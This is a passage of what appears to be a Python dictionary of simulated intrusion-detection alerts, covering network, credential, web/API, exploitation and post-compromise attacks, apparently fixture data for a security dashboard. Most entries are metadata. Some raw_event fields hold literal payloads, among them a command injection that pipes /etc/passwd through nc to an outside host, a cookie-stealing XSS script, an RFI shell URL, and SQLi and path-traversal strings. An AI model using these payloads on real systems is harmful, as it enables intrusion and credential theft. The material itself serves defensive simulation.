        "signature": "ET DOS Smurf Attack ICMP Broadcast Amplification (Spoofed Source)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 83,
        "raw_event": {"broadcast_addr": "10.240.255.255", "amplification_factor": 254, "victim": "10.240.0.1"}
    },
    "FRAGGLE_ATTACK": {
        "name": "UDP Fraggle Broadcast Amplification Attack",
        "src_ip": "203.0.113.33",
        "dst_ip": "10.240.255.255",
        "dst_port": 7,
        "protocol": "UDP",
        "signature": "ET DOS Fraggle Attack UDP Echo Broadcast Amplification",
        "category": "network",
        "severity": "MEDIUM",
        "risk_score": 75,
        "raw_event": {"port": "7 echo", "broadcast": True, "amplification_factor": 200}
    },
    "DNS_AMPLIFICATION": {
        "name": "DNS ANY Reflection Amplification DDoS",
        "src_ip": "195.88.54.55",
        "dst_ip": "10.240.0.1",
        "dst_port": 53,
        "protocol": "UDP",
        "signature": "ET DOS DNS ANY Query Amplification Attack (> 100x amplification factor)",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 93,
        "raw_event": {"query_type": "ANY", "amplification_factor": 140, "gbps": 15.2}
    },
    "NTP_AMPLIFICATION": {
        "name": "NTP MONLIST Reflection Amplification DDoS",
        "src_ip": "45.33.32.88",
        "dst_ip": "10.240.0.1",
        "dst_port": 123,
        "protocol": "UDP",
        "signature": "ET DOS NTP MONLIST Response Amplification DDoS (556x amplification)",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 92,
        "raw_event": {"command": "MONLIST", "amplification_factor": 556, "gbps": 22.4}
    },
    "ARP_SPOOF": {
        "name": "Subnet Man-in-the-Middle ARP Cache Poisoning",
        "src_ip": "10.240.15.200",
        "dst_ip": "10.240.15.1",
        "dst_port": 0,
        "protocol": "ARP",
        "signature": "ET ARP Spoofing Gratuitous ARP Poison -- Gateway Impersonation",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 90,
        "raw_event": {"rogue_mac": "00:11:22:33:44:55", "target_ip": "10.240.15.1", "gratuitous": True}
    },
    "ARP_POISONING": {
        "name": "ARP Cache Table Corruption Attack",
        "src_ip": "10.240.15.188",
        "dst_ip": "10.240.15.1",
        "dst_port": 0,
        "protocol": "ARP",
        "signature": "ET ARP Cache Poisoning Conflicting ARP Replies Detected (MITM Setup)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 87,
        "raw_event": {"poisoned_entries": 12, "victims": ["10.240.15.2", "10.240.15.3"], "redirected": True}
    },
    "MAC_FLOODING": {
        "name": "CAM Table MAC Address Flooding Switch Attack",
        "src_ip": "10.240.15.77",
        "dst_ip": "10.240.15.254",
        "dst_port": 0,
        "protocol": "Ethernet",
        "signature": "ET NETWORK MAC Address Table Flooding Attack (CAM Table Overflow)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 84,
        "raw_event": {"fake_macs": 130000, "switch_model": "Cisco 3850", "cam_overflow": True}
    },
    "DHCP_STARVATION": {
        "name": "DHCP Pool Starvation Address Exhaustion",
        "src_ip": "10.240.15.199",
        "dst_ip": "255.255.255.255",
        "dst_port": 67,
        "protocol": "UDP",
        "signature": "ET NETWORK DHCP Pool Starvation Attack (Address Space Exhaustion)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 82,
        "raw_event": {"discover_pps": 15000, "pool_exhausted": True, "tool": "Gobbler"}
    },
    "DHCP_SPOOFING": {
        "name": "Rogue DHCP Server Configuration Injection",
        "src_ip": "10.240.15.198",
        "dst_ip": "255.255.255.255",
        "dst_port": 68,
        "protocol": "UDP",
        "signature": "ET NETWORK Rogue DHCP Server Offer Detected (Malicious Gateway/DNS Injection)",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 91,
        "raw_event": {"rogue_gateway": "10.240.15.198", "rogue_dns": "10.240.15.198", "clients_affected": 47}
    },
    "DNS_SPOOF": {
        "name": "Rogue DNS Cache Poisoning and Forged Record",
        "src_ip": "198.51.100.77",
        "dst_ip": "10.240.10.2",
        "dst_port": 53,
        "protocol": "UDP",
        "signature": "ET DNS Cache Poisoning Forged A-Record Response (Transaction ID Hijack)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 91,
        "raw_event": {"forged_domain": "auth.bank.internal", "forged_ip": "198.51.100.77", "txid_guessed": True}
    },
    "DNS_CACHE_POISON": {
        "name": "Kaminsky-Style DNS Cache Poisoning Attack",
        "src_ip": "203.0.113.100",
        "dst_ip": "10.240.10.2",
        "dst_port": 53,
        "protocol": "UDP",
        "signature": "ET DNS Kaminsky Cache Poisoning Rapid Transaction ID Flood",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 88,
        "raw_event": {"txid_attempts": 65535, "target_resolver": "10.240.10.2", "poisoned": True}
    },
    "DNS_TUNNELING": {
        "name": "DNS Covert Channel Data Exfiltration Tunnel",
        "src_ip": "10.240.20.55",
        "dst_ip": "8.8.8.8",
        "dst_port": 53,
        "protocol": "UDP",
        "signature": "ET DNS Tunneling Covert Channel High-Entropy Subdomain Query Pattern",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 94,
        "raw_event": {"avg_subdomain_length": 63, "entropy": 7.8, "tool": "iodine", "mb_tunneled": 8.4}
    },
    "IP_SPOOF": {
        "name": "Raw Socket IP Header Forgery and Ingress Spoofing",
        "src_ip": "203.0.113.99",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "TCP",
        "signature": "ET POLICY IP Spoofing Detected X-Forwarded-For Internal IP Bypass Attempt",
        "category": "network",
        "severity": "MEDIUM",
        "risk_score": 85,
        "raw_event": {"spoofed_header": "X-Forwarded-For: 127.0.0.1", "bypass_target": "/admin/console"}
    },
    "SESSION_HIJACK": {
        "name": "Stolen JWT Cookie Replay Session Hijacking",
        "src_ip": "185.220.101.33",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_CLIENT Session Token Replay Attack -- Stolen JWT Bearer",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 92,
        "raw_event": {"token_type": "JWT", "stolen_from": "MITM intercept", "target_api": "/api/v1/admin/users"}
    },
    "MITM": {
        "name": "Man-in-the-Middle Network Traffic Interception",
        "src_ip": "10.240.15.200",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET NETWORK Man-in-the-Middle TLS Interception Proxy Certificate Mismatch",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"technique": "ARP+SSL", "cert_mismatch": True, "intercepted_sessions": 14}
    },
    "MAN_IN_BROWSER": {
        "name": "Man-in-the-Browser Malware DOM Manipulation",
        "src_ip": "185.220.101.22",
        "dst_ip": "10.240.15.44",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN Man-in-the-Browser SpyEye DOM Injection Financial Transaction Tamper",
        "category": "network",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"browser": "Chrome", "inject_target": "banking-portal.com", "transaction_modified": True}
    },
    "SSL_STRIP": {
        "name": "SSL/TLS Stripping HTTPS Downgrade Attack",
        "src_ip": "10.240.15.200",
        "dst_ip": "10.240.10.12",
        "dst_port": 80,
        "protocol": "HTTP",
        "signature": "ET NETWORK SSL Strip HTTPS Downgrade Attack (HSTS Bypass)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 88,
        "raw_event": {"tool": "sslstrip2", "hsts_bypassed": True, "victims": 3}
    },
    "REPLAY_ATTACK": {
        "name": "Authentication Token Replay Attack",
        "src_ip": "198.51.100.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 88,
        "protocol": "Kerberos",
        "signature": "ET POLICY Kerberos Replay Attack Detected -- Duplicate Authenticator Timestamp",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 87,
        "raw_event": {"ticket_replayed": True, "skew_seconds": 0, "target": "LDAP service"}
    },
    "EVIL_TWIN": {
        "name": "Evil Twin Rogue AP SSID Impersonation",
        "src_ip": "10.240.50.100",
        "dst_ip": "10.240.0.1",
        "dst_port": 0,
        "protocol": "802.11",
        "signature": "ET WIRELESS Evil Twin Access Point SSID Spoof Detected (Corporate SSID Cloned)",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 86,
        "raw_event": {"cloned_ssid": "Corp-WiFi-Secure", "rogue_bssid": "AA:BB:CC:DD:EE:FF", "clients_hijacked": 2}
    },
    "WIFI_DEAUTH": {
        "name": "Wi-Fi Deauthentication Forced Disconnect Attack",
        "src_ip": "10.240.50.99",
        "dst_ip": "10.240.0.1",
        "dst_port": 0,
        "protocol": "802.11",
        "signature": "ET WIRELESS Deauthentication Frame Flood -- Client Forced Disconnect (DoS)",
        "category": "network",
        "severity": "MEDIUM",
        "risk_score": 73,
        "raw_event": {"deauth_frames_per_sec": 100, "target_clients": 8, "reason_code": 7}
    },
    "WIFI_EAVESDROP": {
        "name": "Passive Wi-Fi Traffic Eavesdropping Monitor Mode",
        "src_ip": "10.240.50.77",
        "dst_ip": "10.240.0.1",
        "dst_port": 0,
        "protocol": "802.11",
        "signature": "ET WIRELESS Monitor Mode Passive Eavesdrop Capture (WPA2 Handshake Sniff)",
        "category": "network",
        "severity": "MEDIUM",
        "risk_score": 70,
        "raw_event": {"mode": "monitor", "handshakes_captured": 3, "tool": "airodump-ng"}
    },
    "BLUETOOTH_ATTACK": {
        "name": "BlueBorne Bluetooth Remote Code Execution",
        "src_ip": "10.240.50.55",
        "dst_ip": "10.240.15.77",
        "dst_port": 0,
        "protocol": "Bluetooth",
        "signature": "ET BLUETOOTH BlueBorne RCE Stack Overflow (CVE-2017-0781) -- No Pairing Required",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 86,
        "raw_event": {"cve": "CVE-2017-0781", "target_device": "Android 7.1", "requires_pairing": False}
    },
    "ROGUE_AP": {
        "name": "Rogue Unauthorized Access Point Network Insertion",
        "src_ip": "10.240.50.88",
        "dst_ip": "10.240.0.1",
        "dst_port": 0,
        "protocol": "802.11",
        "signature": "ET WIRELESS Rogue Access Point Detected -- Unauthorized AP Connected to Corporate LAN",
        "category": "network",
        "severity": "HIGH",
        "risk_score": 84,
        "raw_event": {"rogue_ssid": "Free-WiFi", "connected_to_switch_port": "SW01:Fa0/24", "clients": 5}
    },
    # ── CREDENTIAL ────────────────────────────────────────────────────────────
    "PASS_SPRAY": {
        "name": "Active Directory Password Spraying Campaign",
        "src_ip": "198.51.100.10",
        "dst_ip": "10.240.10.4",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET CREDENTIAL Password Spraying AD -- Single Password 100+ Accounts (Lockout Evasion)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 91,
        "raw_event": {"password_tested": "Winter2026!", "accounts_targeted": 105, "successes": 2}
    },
    "CRED_STUFF": {
        "name": "Automated Breach Dump Credential Stuffing",
        "src_ip": "45.154.255.88",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET CREDENTIAL Credential Stuffing Breach Combo List Login API (High Velocity)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 93,
        "raw_event": {"combo_list": "COMB_2021", "attempts_per_min": 850, "success_rate": 0.003}
    },
    "PASS_HASH": {
        "name": "NTLM Pass-the-Hash Privilege Impersonation",
        "src_ip": "10.240.15.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET CREDENTIAL NTLM Pass-the-Hash SMB Authentication (No Plaintext Required)",
        "category": "credential",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"ntlm_hash": "31d6cfe0d16ae931b73c59d7e0c089c0", "target_user": "Administrator"}
    },
    "DICT_ATTACK": {
        "name": "RDP Dictionary Attack Common Password Wordlist",
        "src_ip": "203.0.113.88",
        "dst_ip": "10.240.10.4",
        "dst_port": 3389,
        "protocol": "RDP",
        "signature": "ET CREDENTIAL RDP Dictionary Attack Rockyou Wordlist (> 200 failures)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 87,
        "raw_event": {"wordlist": "rockyou.txt", "attempts": 8642, "tool": "ncrack"}
    },
    "CRED_THEFT": {
        "name": "Mimikatz LSASS Memory Credential Dumping",
        "src_ip": "10.240.15.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET CREDENTIAL Mimikatz sekurlsa::logonpasswords LSASS Credential Dump",
        "category": "credential",
        "severity": "CRITICAL",
        "risk_score": 98,
        "raw_event": {"tool": "mimikatz 2.2.0", "command": "sekurlsa::logonpasswords", "hashes_extracted": 14}
    },
    "PASS_TICKET": {
        "name": "Kerberos Pass-the-Ticket Golden Ticket Forge",
        "src_ip": "10.240.15.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 88,
        "protocol": "Kerberos",
        "signature": "ET CREDENTIAL Pass-the-Ticket Golden Ticket Kerberos TGT Forgery",
        "category": "credential",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"ticket_type": "Golden Ticket", "krbtgt_hash_used": True, "valid_days": 10}
    },
    "ASREP_ROAST": {
        "name": "AS-REP Roasting No-Preauthentication Account Harvest",
        "src_ip": "10.240.15.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 88,
        "protocol": "Kerberos",
        "signature": "ET CREDENTIAL AS-REP Roasting Preauthentication Disabled Account TGT Request",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 89,
        "raw_event": {"accounts_targeted": 5, "encryption": "RC4-HMAC", "tool": "Rubeus AS-REP roast"}
    },
    "MFA_FATIGUE": {
        "name": "Multi-Factor Authentication Fatigue Push Bombing",
        "src_ip": "198.51.100.15",
        "dst_ip": "10.240.10.4",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET CREDENTIAL MFA Fatigue Attack -- Repeated Push Notification Spam (Approval Coercion)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 88,
        "raw_event": {"push_count": 47, "target_user": "j.smith@corp.com", "elapsed_minutes": 32}
    },
    "AUTH_BYPASS": {
        "name": "Authentication Bypass JWT None Algorithm",
        "src_ip": "185.220.101.55",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET POLICY JWT Authentication Bypass None Algorithm Attack",
        "category": "credential",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"jwt_alg": "none", "target_endpoint": "/api/admin/users", "bypassed": True}
    },
    "SESSION_TOKEN_THEFT": {
        "name": "XSS-Exfiltrated Session Token Cookie Theft",
        "src_ip": "198.51.100.80",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_CLIENT Session Cookie Theft via XSS Beacon (Unauthorized Session Reuse)",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 90,
        "raw_event": {"cookie_name": "session_id", "exfil_to": "attacker.com/steal", "httponly": False}
    },
    "OAUTH_ABUSE": {
        "name": "OAuth 2.0 Token Abuse Implicit Flow Hijack",
        "src_ip": "185.220.101.66",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET POLICY OAuth Token Abuse Stolen Bearer Access Token API Abuse",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 89,
        "raw_event": {"grant_type": "implicit", "stolen_token": "ya29.a0AfH...", "scope": "admin:read write"}
    },
    "DEFAULT_CRED": {
        "name": "Default Vendor Credential Login on Network Device",
        "src_ip": "203.0.113.120",
        "dst_ip": "10.240.0.1",
        "dst_port": 23,
        "protocol": "Telnet",
        "signature": "ET CREDENTIAL Default Credential Login Success -- admin:admin on Network Device",
        "category": "credential",
        "severity": "CRITICAL",
        "risk_score": 93,
        "raw_event": {"username": "admin", "password": "admin", "device": "Cisco Router IOS"}
    },
    "CRED_PHISHING": {
        "name": "Spear Phishing Credential Harvesting Page",
        "src_ip": "91.108.56.45",
        "dst_ip": "10.240.15.33",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET PHISHING Credential Harvest Page Detected -- Microsoft O365 Login Clone",
        "category": "credential",
        "severity": "HIGH",
        "risk_score": 87,
        "raw_event": {"phishing_domain": "login-microsoft365-secure.com", "target_user": "ceo@corp.com", "clicked": True}
    },
    # ── WEB/API ───────────────────────────────────────────────────────────────
    "CSRF": {
        "name": "Cross-Site Request Forgery State Manipulation",
        "src_ip": "185.220.101.44",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS CSRF Forged Authenticated POST Request (No Anti-CSRF Token)",
        "category": "web_api",
        "severity": "MEDIUM",
        "risk_score": 86,
        "raw_event": {"target": "/api/user/change-email", "referer": "http://malicious.com", "missing_token": True}
    },
    "CMD_INJECT": {
        "name": "OS Command Injection via API Endpoint",
        "src_ip": "185.220.101.88",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER OS Command Injection Shell Operator in HTTP POST Body",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"payload": "host=127.0.0.1; cat /etc/passwd | nc 185.220.101.88 4444", "endpoint": "/api/ping"}
    },
    "SSRF": {
        "name": "Cloud IMDSv1 Server-Side Request Forgery",
        "src_ip": "198.51.100.55",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER SSRF Cloud Metadata Service Access (169.254.169.254) via App",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"url_requested": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "iam_keys": True}
    },
    "XXE": {
        "name": "XML External Entity (XXE) File Ingestion",
        "src_ip": "91.240.118.90",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS XXE XML External Entity DOCTYPE SYSTEM File Read",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 94,
        "raw_event": {"xxe_entity": "file:///etc/passwd", "file_read": True, "response_included": True}
    },
    "BLIND_SQLI": {
        "name": "Blind SQL Injection Boolean-Based Extraction",
        "src_ip": "198.51.100.77",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS Blind SQL Injection Boolean-Based Response Time Attack",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"technique": "Boolean-based blind", "payload": "1' AND SLEEP(5)--", "data_inferred": True}
    },
    "STORED_XSS": {
        "name": "Persistent Stored XSS Payload in Comment Field",
        "src_ip": "198.51.100.55",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS Stored XSS Payload Persisted in Database Comment Field",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 91,
        "raw_event": {"stored_in": "comments.body", "payload": "<script>document.location='http://xss.rocks/'+document.cookie</script>"}
    },
    "REFLECTED_XSS": {
        "name": "Reflected XSS URL Parameter Injection",
        "src_ip": "185.220.101.33",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS Reflected XSS in URI Parameter -- Script Tag Injection",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 86,
        "raw_event": {"param": "q", "payload": "<script>alert(document.domain)</script>", "reflected": True}
    },
    "PATH_TRAVERSAL": {
        "name": "Directory Traversal ../etc/passwd Read",
        "src_ip": "185.220.101.77",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER Path Traversal Directory Traversal ../../etc/passwd Access",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 88,
        "raw_event": {"uri": "/api/files/../../etc/passwd", "file_read": "/etc/passwd", "encoded": True}
    },
    "FILE_INCLUSION": {
        "name": "Local File Inclusion via Parameter Injection",
        "src_ip": "185.220.101.66",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS File Inclusion Vulnerability Exploit LFI/RFI Attempt",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 88,
        "raw_event": {"param": "page", "payload": "../../../../etc/passwd", "null_byte": True}
    },
    "RFI": {
        "name": "Remote File Inclusion PHP Wrapper Exploit",
        "src_ip": "185.220.101.55",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER Remote File Inclusion PHP Wrapper http:// External Payload",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 94,
        "raw_event": {"param": "page", "payload": "http://attacker.com/shell.php", "executed": True}
    },
    "LFI": {
        "name": "Local File Inclusion /proc/self/environ Exploit",
        "src_ip": "185.220.101.44",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER LFI /proc/self/environ Log Poisoning Attempt",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 91,
        "raw_event": {"target_file": "/proc/self/environ", "poisoned_agent": True, "execution": "PHP"}
    },
    "INSECURE_DESER": {
        "name": "Java Deserialization RCE via Serialized Object",
        "src_ip": "198.51.100.33",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SPECIFIC_APPS Insecure Deserialization Java ObjectInputStream RCE Payload",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"magic_bytes": "AC ED 00 05", "gadget_chain": "CommonsCollections6", "rce": True}
    },
    "HTTP_SMUGGLING": {
        "name": "HTTP Request Smuggling TE-CL Desync Attack",
        "src_ip": "185.220.101.88",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER HTTP Request Smuggling TE-CL Desynchronization Attack",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 89,
        "raw_event": {"technique": "TE-CL", "front_end": "HAProxy", "back_end": "nginx", "cache_poisoned": True}
    },
    "HTTP_PARAM_POLL": {
        "name": "HTTP Parameter Pollution Duplicate Key Attack",
        "src_ip": "198.51.100.22",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER HTTP Parameter Pollution Duplicate Parameter Injection",
        "category": "web_api",
        "severity": "MEDIUM",
        "risk_score": 72,
        "raw_event": {"params": "user=admin&user=attacker", "confused_param": "user", "waf_bypass": True}
    },
    "WEB_SHELL": {
        "name": "China Chopper Web Shell Remote Access",
        "src_ip": "91.108.4.100",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN China Chopper Web Shell POST Command Execution (eval base64_decode)",
        "category": "web_api",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"shell_path": "/var/www/html/images/thumb.php", "password": "pass", "eval_payload": True}
    },
    "API_ABUSE": {
        "name": "API Rate Limit Bypass Data Scraping Attack",
        "src_ip": "185.220.101.11",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET POLICY API Abuse Rate-Limit Evasion Rotating IPs Bulk Data Extraction",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 84,
        "raw_event": {"requests_per_second": 450, "rotating_ips": True, "data_scraped_mb": 120}
    },
    "BROKEN_ACCESS": {
        "name": "Broken Access Control IDOR Unauthorized Object",
        "src_ip": "198.51.100.44",
        "dst_ip": "10.240.10.12",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET WEB_SERVER Broken Access Control IDOR -- Horizontal Privilege Escalation",
        "category": "web_api",
        "severity": "HIGH",
        "risk_score": 87,
        "raw_event": {"endpoint": "/api/users/1/profile", "attacker_uid": 2, "accessed_uid": 1, "idor": True}
    },
    # ── EXPLOITATION ─────────────────────────────────────────────────────────
    "BUFFER_OVERFLOW": {
        "name": "Stack-Based NOP Sled Buffer Overflow Shellcode",
        "src_ip": "193.142.58.19",
        "dst_ip": "10.240.10.20",
        "dst_port": 445,
        "protocol": "TCP",
        "signature": "ET EXPLOIT Stack Buffer Overflow NOP Sled EIP Overwrite Shellcode Execution",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"offset": 1024, "eip_overwrite": "0x41414141", "shellcode_len": 345}
    },
    "PRIV_ESC": {
        "name": "Linux SUID Binary Local Privilege Escalation",
        "src_ip": "10.240.15.55",
        "dst_ip": "10.240.15.55",
        "dst_port": 0,
        "protocol": "LOCAL",
        "signature": "ET EXPLOIT Linux SUID GTFOBin Privilege Escalation Root Shell Spawn",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"binary": "/usr/bin/find", "technique": "GTFOBins", "result_uid": 0}
    },
    "ZERO_DAY": {
        "name": "Polymorphic Zero-Day Vector (AI Behavioral Detection)",
        "src_ip": "193.142.58.99",
        "dst_ip": "10.240.10.99",
        "dst_port": 8443,
        "protocol": "TLS",
        "signature": "ET EXPLOIT Zero-Day Polymorphic Binary Anomaly -- AI Entropy Behavioral Block",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 99,
        "raw_event": {"entropy": 7.95, "signature_match": False, "ai_detected": True, "cve": "CVE-2026-UNKNOWN"}
    },
    "DLL_HIJACK": {
        "name": "DLL Search Order Hijacking via Trusted Executable",
        "src_ip": "10.240.15.77",
        "dst_ip": "10.240.15.77",
        "dst_port": 0,
        "protocol": "LOCAL",
        "signature": "ET EXPLOIT DLL Hijacking -- Malicious DLL Placed in Trusted Application Directory",
        "category": "exploitation",
        "severity": "HIGH",
        "risk_score": 91,
        "raw_event": {"dll": "version.dll", "app_dir": "C:\\Program Files\\TrustedApp\\", "executed_as": "SYSTEM"}
    },
    "REMOTE_PRIV_ESC": {
        "name": "Remote Privilege Escalation via Service Misconfiguration",
        "src_ip": "185.220.101.44",
        "dst_ip": "10.240.10.4",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET EXPLOIT Remote Privilege Escalation Writable Service Path EoP",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"writable_path": "C:\\Program Files\\VulnService\\", "replaced_binary": True, "nt_authority": True}
    },
    "HEAP_OVERFLOW": {
        "name": "Heap Spray Browser Use-After-Free Exploit",
        "src_ip": "185.220.101.33",
        "dst_ip": "10.240.15.66",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET EXPLOIT Browser Heap Spray Use-After-Free CVE-2023-HEAP Memory Corruption",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"technique": "Heap Spray", "target_browser": "Chrome 119", "freed_chunk_size": 512}
    },
    "RACE_CONDITION": {
        "name": "TOCTOU Race Condition Filesystem Privilege Exploit",
        "src_ip": "10.240.15.44",
        "dst_ip": "10.240.15.44",
        "dst_port": 0,
        "protocol": "LOCAL",
        "signature": "ET EXPLOIT TOCTOU Time-of-Check-Time-of-Use Race Condition -- Symlink Escalation",
        "category": "exploitation",
        "severity": "HIGH",
        "risk_score": 86,
        "raw_event": {"race_window_ms": 3, "symlink_target": "/etc/shadow", "writes": 10000}
    },
    "SUPPLY_CHAIN": {
        "name": "SolarWinds-Style Supply Chain Software Backdoor",
        "src_ip": "45.77.65.33",
        "dst_ip": "10.240.10.4",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET TROJAN Supply Chain Backdoor C2 Communication -- Signed Update Package Trojanized",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 100,
        "raw_event": {"trojanized_package": "vendor-update-v2.3.1.msi", "signed": True, "c2": "avsvmcloud.com"}
    },
    "CONTAINER_ESCAPE": {
        "name": "Docker Container Escape via Privileged Mode",
        "src_ip": "10.240.10.55",
        "dst_ip": "10.240.10.55",
        "dst_port": 0,
        "protocol": "LOCAL",
        "signature": "ET EXPLOIT Docker Container Escape Privileged Flag Host Filesystem Mount",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 95,
        "raw_event": {"privileged": True, "host_mount": "/", "escaped_to_host": True, "cve": "CVE-2024-21626"}
    },
    "CLOUD_PRIV_ABUSE": {
        "name": "AWS IAM Privilege Escalation via Misconfigured Role",
        "src_ip": "198.51.100.88",
        "dst_ip": "169.254.169.254",
        "dst_port": 443,
        "protocol": "HTTPS",
        "signature": "ET CLOUD AWS IAM Role Privilege Escalation -- AssumeRole Chain to AdministratorAccess",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 97,
        "raw_event": {"initial_role": "S3ReadOnly", "escalated_to": "AdministratorAccess", "iam_chain": 3}
    },
    "CLOUD_METADATA": {
        "name": "AWS IMDS v1 Metadata Service Credential Theft",
        "src_ip": "198.51.100.55",
        "dst_ip": "169.254.169.254",
        "dst_port": 80,
        "protocol": "HTTP",
        "signature": "ET CLOUD IMDSv1 Metadata Service Access -- IAM Credentials Extraction via SSRF",
        "category": "exploitation",
        "severity": "CRITICAL",
        "risk_score": 96,
        "raw_event": {"metadata_path": "/latest/meta-data/iam/security-credentials/ec2-role", "iam_keys_returned": True}
    },
    # ── POST-COMPROMISE ───────────────────────────────────────────────────────
    "LATERAL_MOVE": {
        "name": "PsExec WMI Remote Execution Lateral Movement",
        "src_ip": "10.240.15.22",
        "dst_ip": "10.240.10.4",
        "dst_port": 445,
        "protocol": "SMB",
        "signature": "ET POST_COMPROMISE Lateral Movement PsExec WMI Remote Command Execution",
        "category": "post_compromise",
        "severity": "HIGH",
        "risk_score": 94,
